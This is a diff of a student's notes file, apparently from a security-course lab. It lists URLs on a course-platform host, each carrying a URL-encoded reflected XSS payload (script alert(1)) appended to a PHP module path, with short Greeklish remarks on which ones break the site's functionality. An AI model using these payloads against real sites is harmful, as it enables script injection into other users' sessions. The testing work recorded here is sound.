@@ -50,7 +50,9 @@ http://the-intruders.csec.chatzi.org/modules/course_info/delete_course.php/%22%2
 http://the-intruders.csec.chatzi.org/modules/user/muladduser.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 http://the-intruders.csec.chatzi.org/modules/group/group.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
 http://the-intruders.csec.chatzi.org/modules/course_tools/course_tools.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E.com
-
+http://the-intruders.csec.chatzi.org/modules/exercice/exercice_submit.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://the-intruders.csec.chatzi.org/modules/group/group_email.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://the-intruders.csec.chatzi.org/modules/import/import.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 
 
 
@@ -61,13 +63,18 @@ http://the-intruders.csec.chatzi.org/modules/course_tools/course_tools.php/%22%2
 -------------------TA TELEUTAIA----------
 
 http://the-intruders.csec.chatzi.org/modules/auth/newprof.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+auta xalane thn leitourgikotita meta
 http://the-intruders.csec.chatzi.org/modules/conference/messageList.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
-http://the-intruders.csec.chatzi.org/modules/exercice/exercice_submit.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
-http://the-intruders.csec.chatzi.org/modules/group/group_email.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
-http://the-intruders.csec.chatzi.org/modules/import/import.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
----http://the-intruders.csec.chatzi.org/modules/learnPath/navigation/showExercise.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://the-intruders.csec.chatzi.org/modules/learnPath/navigation/showExercise.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+
+
+auto fainetai ok den nomizw na xalaei kati
 ---http://the-intruders.csec.chatzi.org/modules/learnPath/navigation/updateProgress.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
 http://the-intruders.csec.chatzi.org/modules/admin/sysinfo/index.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+den xerw gi auta
 http://the-intruders.csec.chatzi.org/modules/admin/sysinfo/includes/system_footer.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 
 
